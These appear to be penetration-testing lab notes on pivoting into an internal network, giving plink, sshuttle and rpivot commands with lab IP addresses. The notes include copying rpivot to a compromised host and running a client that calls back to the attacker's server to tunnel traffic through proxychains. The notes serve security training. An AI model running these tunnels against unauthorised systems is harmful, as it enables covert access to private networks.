
## Plink (Part of putty suite) Windows Method

Setting up ssh socks proxy via plink
```cmd-session
plink -ssh -D 9050 ubuntu@10.129.15.50
```


## sshuttle

Installing
```shell-session
sudo apt-get install sshuttle
```

Running
```shell-session
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```
With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

Run commands like usual since we have the entry within iptables and traffic is being routed.

## Rpivot
https://github.com/klsecservices/rpivot

Starting from attack host
```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Transferring rpivot via ssh
```shell-session
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

Running rpivot on pivot target
```shell-session
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```
We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Connect via proxychains
```shell-session
proxychains firefox-esr 172.16.5.135:80
```

Connect to web server via http-proxy & NTLM Auth
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
